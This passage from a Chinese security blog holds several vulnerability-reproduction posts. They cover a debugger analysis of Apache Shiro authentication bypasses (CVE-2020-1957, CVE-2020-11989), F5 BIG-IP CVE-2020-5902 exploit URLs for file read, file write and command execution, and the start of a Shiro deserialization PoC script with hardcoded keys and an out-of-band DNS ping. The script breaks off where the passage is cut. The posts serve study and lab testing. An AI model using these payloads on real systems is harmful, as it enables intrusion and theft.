&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function">ShiroFilterFactoryBean <span class="title">shiroFilterFactoryBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean bean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line">        bean.setSecurityManager(securityManager());</span><br><span class="line">        bean.setLoginUrl(<span class="string">"/login"</span>);</span><br><span class="line">        bean.setSuccessUrl(<span class="string">"/index"</span>);</span><br><span class="line">        bean.setUnauthorizedUrl(<span class="string">"/unauthorizedurl"</span>);</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"/doLogin"</span>, <span class="string">"anon"</span>);</span><br><span class="line">        map.put(<span class="string">"/guest/*"</span>, <span class="string">"anon"</span>);</span><br><span class="line">        map.put(<span class="string">"/admin/*"</span>, <span class="string">"authc"</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置LoginController：</p><figure class="highlight java"><figcaption><span>LoginController.class</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.debug.shiro.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/doLogin"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doLogin</span><span class="params">(String username, String password)</span> </span>&#123;</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(<span class="keyword">new</span> UsernamePasswordToken(username, password));</span><br><span class="line">            System.out.println(<span class="string">"登录成功!"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">"登录失败!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/guest/*"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">guest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"guest page"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/admin/index"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"admin page"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/login"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String  <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"please login!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以开始运行</p><p><img src="/imgs/image-20200713152726548.png" alt="image-20200713152726548"></p><p>访问 <a href="http://localhost:8080/login" target="_blank" rel="noopener">http://localhost:8080/login</a></p><p><img src="/imgs/image-20200713152826010.png" alt="image-20200713152826010"></p><p>至此，环境搭建成功。</p><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><h4 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h4><p>访问 <a href="http://localhost:8080/admin/index" target="_blank" rel="noopener">http://localhost:8080/admin/index</a> ，可以看到被拦截，需要登录</p><p><img src="/imgs/image-20200713154205020.png" alt="image-20200713154205020"></p><p>访问 <a href="http://localhost:8080/admin/index/" target="_blank" rel="noopener">http://localhost:8080/admin/index/</a> ，直接进入admin界面，无需登录</p><p><img src="/imgs/image-20200713154233782.png" alt="image-20200713154233782"></p><h4 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h4><p>访问 <a href="http://localhost:8080/;/admin/index" target="_blank" rel="noopener">http://localhost:8080/;/admin/index</a> ，绕过登录进入admin界面</p><p><img src="/imgs/image-20200713154421239.png" alt="image-20200713154421239"></p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="拦截器基础知识"><a href="#拦截器基础知识" class="headerlink" title="拦截器基础知识"></a>拦截器基础知识</h3><p>在debug分析前，先学习下Shiro拦截器的规则： <a href="https://www.jianshu.com/p/3671b97aab3d" target="_blank" rel="noopener">https://www.jianshu.com/p/3671b97aab3d</a> </p><p>Shiro拦截器有11种，这里只简单看下anon和authc，anon不需要认证可以直接访问，对应上述的/guest/*和/dologin，authc需要认证才能访问，对应/admin/*。</p><p><img src="/imgs/image-20200713161043499.png" alt="image-20200713161043499"></p><p>文章中介绍了两种拦截器配置方法：INI文件文件配置和代码配置，复现例子中用的是代码配置。</p><p>拦截器规则通配符如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?：匹配一个字符</span><br><span class="line">*：匹配零个或多个字符</span><br><span class="line">**：匹配零个或多个路径</span><br></pre></td></tr></table></figure><p>CVE-2020-1957复现例子中用到的是/admin/*，只匹配了admin下的文件，不会匹配多个路径，可以复现成功，如果是/admin/**则复现失败，有一定的局限性；而CVE-2020-11989无论是/admin/*还是/admin/**都可以复现成功。</p><h3 id="CVE-2020-1957分析"><a href="#CVE-2020-1957分析" class="headerlink" title="CVE-2020-1957分析"></a>CVE-2020-1957分析</h3><p>根据commit信息 <a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce</a> ，对WebUtils#getPathWithinApplication等进行了修复</p><p><img src="/imgs/image-20200714131644955.png" alt="image-20200714131644955"></p><p>所以我们在org.apache.shiro.web.util.WebUtils#getPathWithinApplication:48行打断点，开始debug模式，然后访问 <a href="http://127.0.0.1:8080/admin/index/" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/index/</a> 开始分析</p><p>F8执行到String requestUri = getRequestUri(request) 然后继续执行</p><p><img src="/imgs/image-20200714132604290.png" alt="image-20200714132604290"></p><p>一直F8直到获取URI，getRequestUri(request) 返回的uri是我们输入的请求：/admin/index/</p><p><img src="/imgs/image-20200714102608525.png" alt="image-20200714102608525"></p><p>继续F8进入getPathWithinApplication(HttpServletRequest request)，返回/admin/index/</p><p><img src="/imgs/image-20200714102956166.png" alt="image-20200714102956166"></p><p>继续F8进入PathMatchingFilterChainResolver#getChain，拿到了刚刚getPathWithinApplication获取的请求URI-/admin/index/，将请求的URI链匹配配置的过滤规则链</p><p><img src="/imgs/image-20200713223910948.png" alt="image-20200713223910948"></p><p>执行到while条件时，F7进入pathMatches</p><p><img src="/imgs/image-20200714133200908.png" alt="image-20200714133200908"></p><p>pathMatches收到两个参数，pattern和path，一个是设置的规则链，一个是请求的路径，return pathMatcher.matches(pattern, path)我们F7进入pathMatcher.matches</p><p><img src="/imgs/image-20200714133408631.png" alt="image-20200714133408631"></p><p>此时进入到了org.apache.shiro.util.AntPathMatcher#matches，继续深入，会调用doMatch</p><p><img src="/imgs/image-20200714133928022.png" alt="image-20200714133928022"></p><p>分析doMatch，主要是用来匹配规则链和请求</p><p><img src="/imgs/image-20200714134656016.png" alt="image-20200714134656016"></p><p>继续执行，一直while循环到/admin/*和/admin/index/进行比较再来看下。分解路径时，是以”/“来进行分解，/admin/index/分解后的是{“admin”,”index”}，<strong>这里是和/admin/index分解后的结果一样</strong>，继续往下进入循环，第一个字符串相比较都是admin肯定一样，继续循环比较第二个*和index，调用matchStrings方法</p><p><img src="/imgs/image-20200714151630406.png" alt="image-20200714151630406"></p><p>F7看下matchStrings，比较*和index。循环比较每个字符，当字符为*，说明规则包含*，退出比较，返回true，匹配成功</p><p><img src="/imgs/image-20200714152537290.png" alt="image-20200714152537290"></p><p>继续回到doMatch，循环结束，此时返回pattern.endsWith(this.pathSeparator) ? path.endsWith(this.pathSeparator) : !path.endsWith(this.pathSeparator)，pattern.endsWith(this.pathSeparator) ，规则链/admin/*不是以分隔符/结尾，所以返回!path.endsWith(this.pathSeparator)，/admin/index/是以分隔符/结尾，所以为true，最终返回false，没有匹配到规则链。假设本来请求的是/admin/index，不以/结尾，这里最终会返回true，成功匹配到规则链</p><p><img src="/imgs/image-20200714153059523.png" alt="image-20200714153059523"></p><p>回到getChain，因为返回结果为false即没有匹配成功，所以while会继续循环，直到迭代完成，返回null。这里假如是请求/admin/index，匹配到了，会执行 filterChainManager.proxy(originalChain, pathPattern)，也就会进行代理。但是这里直接返回null没有执行proxy从而绕过了鉴权。</p><p><img src="/imgs/image-20200714153812174.png" alt="image-20200714153812174"></p><p>接下来继续分析如何获取到/admin/index的资源</p><p>F8到getMatchingPattern调用org.springframework.util.AntPathMatcher#match，然后doMatch</p><p><img src="/imgs/image-20200714205353393.png" alt="image-20200714205353393"></p><p>深入分析doMatch，可以看到跟之前类似，都是用/直接分解路径，然后依次比较，由于一个是以/结尾 一个不是，所以最终返回了false</p><p><img src="/imgs/image-20200714205939671.png" alt="image-20200714205939671"></p><p>getMatchingPattern(“/admin/index”, “/admin/index/“)返回/admin/index/</p><p><img src="/imgs/image-20200714211044556.png" alt="image-20200714211044556"></p><p>getMatchingPatterns返回matches={“/admin/index/“}</p><p><img src="/imgs/image-20200714211754168.png" alt="image-20200714211754168"></p><p>继续F8，返回到AbstractHandlerMethodMapping#addMatchingMappings，match=”/admin/index/“，因为match不为NULL，认为匹配成功了，直接获取/admin/index的资源</p><p><img src="/imgs/image-20200714215504718.png" alt="image-20200714215504718"></p><p>最后梳理下，首先鉴权的时候，匹配规则链doMatch用/进行分隔，/admin/index/和/admin/index效果一样，因为一个以/结尾，一个不以/结尾返回false绕过了鉴权；请求资源的时候，匹配规则链时同样存在问题，getMatchingPattern返回的match不为NULL就判断匹配成功，获取到/admin/index的资源。</p><h3 id="CVE-2020-11989分析"><a href="#CVE-2020-11989分析" class="headerlink" title="CVE-2020-11989分析"></a>CVE-2020-11989分析</h3><p>更上面同样的断点，访问 <a href="http://127.0.0.1:8080/;/admin/index" target="_blank" rel="noopener">http://127.0.0.1:8080/;/admin/index</a> ，开始debug</p><p>调用getRequestUri(request)，进入该方法</p><p><img src="/imgs/image-20200714234621778.png" alt="image-20200714234621778"></p><p>获取返回值时，调用decodeAndCleanUriString(request, uri)，分析该方法如图，该方法对含有;的URI进行了处理，当有;时，获取;前的字符串，此时返回/</p><p><img src="/imgs/image-20200714235245592.png" alt="image-20200714235245592"></p><p>经过normaliz返回/</p><p><img src="/imgs/image-20200714235743342.png" alt="image-20200714235743342"></p><p>此时请求URI由”/;/admin/index”变成了”/“，然后再去匹配chain规则链就跟之前一样，不能匹配从而绕过鉴权</p><p><img src="/imgs/image-20200715000016874.png" alt="image-20200715000016874"></p><p>接下来分析是如何获取/admin/index的资源</p><p>F8直到org.springframework.web.util.UrlPathHelper#getRequestUri</p><p><img src="/imgs/image-20200715000707589.png" alt="image-20200715000707589"></p><p>分析 this.decodeAndCleanUriString</p><p><img src="/imgs/image-20200715001035983.png" alt="image-20200715001035983"></p><p>调用removeSemicolonContent，返回//admin/index</p><p><img src="/imgs/image-20200715001526885.png" alt="image-20200715001526885"></p><p>继续执行，调用 this.getSanitizedPath</p><p><img src="/imgs/image-20200715001735002.png" alt="image-20200715001735002"></p><p>经过getSanitizedPath，将//处理成/，最终获取的是/admin/index</p><p><img src="/imgs/image-20200715002010255.png" alt="image-20200715002010255"></p><p>总结下，首先请求/;/admin/index要先进行鉴权，经过org.apache.shiro.web.util.WebUtils#decodeAndCleanUriString(request, uri)处理成/，绕过了授权，然后请求时再经过org.springframework.web.util.UrlPathHelper#decodeAndCleanUriString获取/admin/index的资源</p><p>参考链接：</p><p><a href="https://developer.aliyun.com/article/695233" target="_blank" rel="noopener">Spring Boot 2.x基础教程：快速入门</a><br><a href="https://segmentfault.com/a/1190000019440231" target="_blank" rel="noopener">Spring Boot 整合 Shiro ，两种方式全总结！</a><br><a href="https://www.jianshu.com/p/3671b97aab3d" target="_blank" rel="noopener">SpringBoot:集成Shiro之拦截器配置</a><br><a href="https://www.freebuf.com/vuls/231909.html" target="_blank" rel="noopener">Shiro权限绕过漏洞分析（CVE-2020-1957）</a><br><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> Apache Shiro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache Shiro </tag>
            
            <tag> 身份认证绕过 </tag>
            
            <tag> CVE-2020-1957 </tag>
            
            <tag> CVE-2020-11989 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>F5 BIG-IP CVE-2020-5902漏洞复现</title>
      <link href="2020/07/08/F5-BIG-IP%20F5%20BIG-IP%20CVE-2020-5902%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/07/08/F5-BIG-IP%20F5%20BIG-IP%20CVE-2020-5902%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>注册登录f5.com</p><p>下载链接：<a href="http://downloads05.f5.com/esd/download.sv?loc=downloads05.f5.com/downloads/2d436b59-25af-43c4-ab3f-9ebb1d6f5ee6/BIGIP-14.1.2-0.0.37.ALL-scsi.ova" target="_blank" rel="noopener">http://downloads05.f5.com/esd/download.sv?loc=downloads05.f5.com/downloads/2d436b59-25af-43c4-ab3f-9ebb1d6f5ee6/BIGIP-14.1.2-0.0.37.ALL-scsi.ova</a></p><p>本站下载链接：（<a href="http://rita888.github.io/download/BIGIP-14.1.2-0.0.37.ALL-scsi.ova）" target="_blank" rel="noopener">http://rita888.github.io/download/BIGIP-14.1.2-0.0.37.ALL-scsi.ova）</a></p><p>下载完成，虚拟机导入：</p><p><img src="/imgs/image-20200708125734115.png" alt="image-20200708125734115"></p><p><img src="/imgs/image-20200708140122139.png" alt="image-20200708140122139"></p><p>选择部署选项</p><p><img src="/imgs/image-20200708125846124.png" alt="image-20200708125846124"></p><p>等待开机</p><p><img src="/imgs/image-20200708140440711.png" alt="image-20200708140440711"></p><p>输入默认用户名：root 和密码：default，输入后要重置密码随意【bigip123】</p><p><img src="/imgs/image-20200708140545061.png" alt="image-20200708140545061"></p><p>输入config后进入界面点击OK，选择IPv4</p><p><img src="/imgs/image-20200708140728897.png" alt="image-20200708140728897"></p><p>选择是否用默认地址，我选择NO，然后设置IP配置信息（虚拟机设置我用了net模式后重启）</p><p><img src="/imgs/image-20200708140831644.png" alt="image-20200708140831644"></p><p>宿主机登录，注意是https</p><p><img src="/imgs/image-20200708173628387.png" alt="image-20200708173628387"></p><p>登录用admin/admin失败，百度查询方法，命令行重置admin然后登录成功</p><p><img src="/imgs/image-20200708173710407.png" alt="image-20200708173710407"></p><p>稍等界面出来，然后点击next激活</p><p><img src="/imgs/image-20200708173830592.png" alt="image-20200708173830592"></p><p>F5官网注册登录后获取的key，通过邮件得到（没有注册响应先注册）</p><p><img src="/imgs/image-20200708174255634.png" alt="image-20200708174255634"></p><p>输入key，点击manual、next</p><p><img src="/imgs/image-20200708174455250.png" alt="image-20200708174455250"></p><p>获取到Dossier，然后step2点击链接，获取license</p><p><img src="/imgs/image-20200708174953810.png" alt="image-20200708174953810"></p><p>复制粘贴license</p><p><img src="/imgs/image-20200708175126760.png" alt="image-20200708175126760"></p><p>等待重置成功即可。</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><h3 id="任意文件读取："><a href="#任意文件读取：" class="headerlink" title="任意文件读取："></a>任意文件读取：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts</span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license</span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20200708181910106.png" alt="image-20200708181910106"></p><h3 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Save接口</span></span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&amp;content=Vultest</span><br><span class="line"><span class="comment"># Read接口</span></span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/test</span><br></pre></td></tr></table></figure><p>上传无反馈：<a href="https://192.168.116.144/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&amp;content=Vultest" target="_blank" rel="noopener">https://192.168.116.144/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&amp;content=Vultest</a></p><p>读取：</p><p><img src="/imgs/image-20200708185748081.png" alt="image-20200708185748081"></p><h3 id="RCE："><a href="#RCE：" class="headerlink" title="RCE："></a>RCE：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tmsh接口</span></span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20200708185449918.png" alt="image-20200708185449918"></p><p>参考链接：</p><p><a href="http://www.hackdig.com/07/hack-100823.htm" target="_blank" rel="noopener">http://www.hackdig.com/07/hack-100823.htm</a></p><p><a href="https://blog.csdn.net/wuyou1995/article/details/107170186" target="_blank" rel="noopener">https://blog.csdn.net/wuyou1995/article/details/107170186</a></p>]]></content>
      
      
      <categories>
          
          <category> F5 BIG-IP </category>
          
          <category> CVE-2020-5902 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> F5 BIG-IP </tag>
            
            <tag> 远程代码执行 </tag>
            
            <tag> 文件读取 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Shiro CVE-2016-4437反序列化漏洞学习</title>
      <link href="2020/06/22/Apache-Shiro-CVE-2016-4437%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2020/06/22/Apache-Shiro-CVE-2016-4437%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VUL = [<span class="string">"CVE-2016-4437"</span>]</span><br><span class="line">VUL_NAME = [<span class="string">"Apache Shiro反序列化漏洞"</span>]</span><br><span class="line">TYPE = [<span class="string">"Deserialize Remote Code Execution"</span>]</span><br><span class="line">DESCRIPTION = <span class="string">'''shiro提供的rememberMe的功能，登入页面时勾选rememberMe的时候，会把cookie写到客户端保存，关闭浏览器再打开，访问网页时还是属于登入状态。'''</span></span><br><span class="line">IMPACT = [<span class="string">"Apahce Shiro &lt;= 1.2.4"</span>]</span><br></pre></td></tr></table></figure><h2 id="0x01-复现"><a href="#0x01-复现" class="headerlink" title="0x01 复现"></a>0x01 复现</h2><h3 id="目标环境："><a href="#目标环境：" class="headerlink" title="目标环境："></a>目标环境：</h3><ul><li>Centos7 + vulhub[shiro/CVE-2016-4437]</li></ul><p>为了能让docker环境上网，改写了docker-compose.yml，加了”network_mode:host“：</p><p><img src="/imgs/image-20200623143555729.png" alt="image-20200623143555729"></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>根据<a href="https://github.com/Medicean/VulApps/blob/master/s/shiro/1/poc.py" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/blob/master/s/shiro/1/poc.py</a> 稍微加工了下：</p><figure class="highlight python"><figcaption><span>CVE_2016_4437.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 备注：python3只安装pycryptohome[python-dev]</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'../../1Tools/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar'</span></span><br><span class="line"></span><br><span class="line">KEY = [<span class="string">'kPH+bIxk5D2deZiIxcaaaA=='</span>,<span class="string">'4AvVhmFLUs0KTA3Kprsdag=='</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CVE_2016_4437</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"http"</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            self.url = <span class="string">"http://"</span> + self.url</span><br><span class="line">        self.info = &#123;</span><br><span class="line">            <span class="string">"VUL"</span>: <span class="string">"CVE-2016-4437"</span>,</span><br><span class="line">            <span class="string">"VUL_NAME"</span>: <span class="string">"Apache Shiro反序列化漏洞"</span>,</span><br><span class="line">            <span class="string">"TYPE"</span>: <span class="string">"Deserialize Remote Code Execution"</span>,</span><br><span class="line">            <span class="string">"DESCRIPTION"</span>: <span class="string">"shiro提供的rememberMe的功能，登入页面时勾选rememberMe的时候，会把cookie写到客户端保存，关闭浏览器再打开，访问网页时还是属于登入状态。"</span>,</span><br><span class="line">            <span class="string">"REFERENCE"</span>: <span class="string">"https://www.freebuf.com/column/220958.html, https://www.freebuf.com/vuls/231909.html"</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.vulWarning = <span class="string">'Target '</span> + self.url + <span class="string">' has vulnerablity: '</span> + self.info.get(<span class="string">'VUL'</span>) + <span class="string">'\n \n'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">headerToString</span><span class="params">(self, header)</span>:</span></span><br><span class="line">        str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> header.keys():</span><br><span class="line">            tmpstr = key + <span class="string">': '</span> + header.get(key) + <span class="string">'\n'</span></span><br><span class="line">            str = str + tmpstr</span><br><span class="line">        <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">'User-Agent'</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 换成自己的dns</span></span><br><span class="line">            payload = self.generator(<span class="string">'ping shiro.****.ceye.io'</span>)</span><br><span class="line">            r = requests.get(self.url, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">            httpResponse = self.vulWarning + self.url +<span class="string">"\nHTTP Request Headers\n"</span> +\</span><br><span class="line">                               self.headerToString(r.request.headers)\</span><br><span class="line">                               + <span class="string">" \nHTTP Response Body:\n"</span> + str(r.text)</span><br><span class="line">            <span class="keyword">return</span> httpResponse</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(self, rce_command)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = self.generator(rce_command)</span><br><span class="line">            r = requests.get(self.url, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">            print(r.text)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># key生成rememberMe</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(self, command, fp=JAR_FILE)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span 